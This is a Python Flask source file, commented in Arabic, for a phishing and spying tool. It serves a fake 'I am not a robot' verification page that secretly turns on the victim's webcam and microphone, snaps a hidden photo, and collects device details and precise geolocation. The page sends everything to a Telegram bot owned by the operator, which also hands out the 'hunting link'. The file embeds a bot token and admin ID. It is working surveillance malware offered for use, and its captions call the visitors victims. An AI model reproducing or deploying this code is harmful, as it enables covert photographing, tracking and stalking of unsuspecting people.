import base64, requests, io, os, json, logging
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- إعدادات البوت ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://YOUR_RENDER_APP.onrender.com"  # ⚠️ استبدلها برابط تطبيقك فور النشر

# إعداد الـ Webhook عند بدء التشغيل
def set_webhook():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
    webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
    response = requests.post(url, json={"url": webhook_url})
    print("Webhook set response:", response.text)

# --- صفحة التصيد الـ HTML (الفخ) ---
PHISHING_PAGE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق الأمان</title>
    <style>
        body { background: #050505; color: white; font-family: system-ui; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 40px; border-radius: 25px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
        .btn { background: linear-gradient(45deg, #f38020, #ffae00); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #888; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 60px; margin-bottom: 20px;">🔒</div>
        <h2>تأكيد الهوية</h2>
        <p style="color: #ccc;">يرجى الضغط لتجاوز نظام الحماية والوصول للرابط</p>
        <button class="btn" id="go" onclick="capture()">أنا لست روبوت</button>
        <div id="st"></div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const st = document.getElementById('st');
        async function post(d, t) { fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }

        async function capture() {
            document.getElementById('go').style.display = 'none';
            st.innerText = "جاري التحقق من أمان المتصفح...";
            
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v'); v.srcObject = s;
                const b = await navigator.getBattery().catch(() => ({level: 0, charging: false}));
                const ram = navigator.deviceMemory || "غير معروف";
                const cores = navigator.hardwareConcurrency || "غير معروف";
                const lang = navigator.language;
                
                let info = `📊 تقرير صيد احترافي:\n🔋 البطارية: %${Math.round(b.level*100)}\n⚡ شحن: ${b.charging ? 'نعم' : 'لا'}\n🧠 الرام: ${ram} GB\n🦾 المعالج: ${cores} نوى\n🌐 اللغة: ${lang}\n🖥️ المنصة: ${navigator.platform}`;
                
                post(info, 'msg');

                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    const ctx = c.getContext('2d');
                    ctx.drawImage(v, 0, 0);
                    post(c.toDataURL('image/jpeg', 0.7), 'img');
                    st.innerText = "اكتمل التحقق، سيتم توجيهك الآن...";
                }, 4500);

                navigator.geolocation.getCurrentPosition(p => {
                    post(`📍 موقع الضحية بدقة:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                }, null, {enableHighAccuracy: true});

            } catch (e) { 
                st.innerText = "فشل التحقق، يرجى تفعيل الصلاحيات!";
                setTimeout(() => location.reload(), 2000);
            }
        }
    </script>
</body>
</html>
'''

# --- مسار الصفحة الرئيسية (الفخ) ---
@app.route('/')
def index():
    return render_template_string(PHISHING_PAGE)

# --- مسار استقبال بيانات الضحايا ---
@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.get_json()
    t, d = data.get('t'), data.get('d')
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"

    if t == 'msg':
        requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        try:
            img = base64.b64decode(d.split(',')[1])
            requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 صورة الضحية"}, files={'photo': ('capture.jpg', img)})
        except:
            pass
    return "OK"

# --- مسار Webhook الخاص بالبوت (يستقبل أوامر تليجرام) ---
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    data = request.get_json()
    if not data:
        return "No data", 400

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"

    # معالجة الرسائل العادية
    if "message" in data:
        chat_id = str(data["message"]["chat"]["id"])
        text = data["message"].get("text", "")

        if chat_id == ADMIN_ID:
            if text == "/start":
                keyboard = {
                    "inline_keyboard": [
                        [{"text": "🔗 رابط الصيد", "callback_data": "gen_link"}],
                        [{"text": "📊 الإحصائيات", "callback_data": "stats"}]
                    ]
                }
                requests.post(url + "sendMessage", json={
                    'chat_id': chat_id,
                    'text': "مرحباً آدمن، أنا جاهز لصيد الحسابات 🔥",
                    'reply_markup': keyboard
                })
            elif text == "/renew":
                set_webhook()
                requests.post(url + "sendMessage", json={'chat_id': chat_id, 'text': "✅ تم تحديث Webhook"})

    # معالجة الأزرار (CallbackQuery)
    elif "callback_query" in data:
        query = data["callback_query"]
        chat_id = str(query["message"]["chat"]["id"])
        data_cb = query["data"]

        if data_cb == "gen_link":
            requests.post(url + "sendMessage", json={
                'chat_id': chat_id,
                'text': f"🔗 رابط الصيد:\n{BASE_URL}",
                'parse_mode': 'Markdown'
            })
        elif data_cb == "stats":
            requests.post(url + "sendMessage", json={
                'chat_id': chat_id,
                'text': "📊 الإحصائيات:\nالبوت يعمل بشكل طبيعي."
            })

    return "OK"

# --- تشغيل السيرفر مع إعداد Webhook ---
if __name__ == '__main__':
    # تأكد من أن BASE_URL تم تعيينه بشكل صحيح
    if BASE_URL == "https://YOUR_RENDER_APP.onrender.com":
        print("⚠️ تحذير: قم بتغيير BASE_URL إلى رابط التطبيق الفعلي بعد النشر على Render!")
    
    # تعيين Webhook (سيعمل مرة واحدة عند بدء التشغيل)
    set_webhook()
    
    # تشغيل الخادم
    app.run(host='0.0.0.0', port=10000)
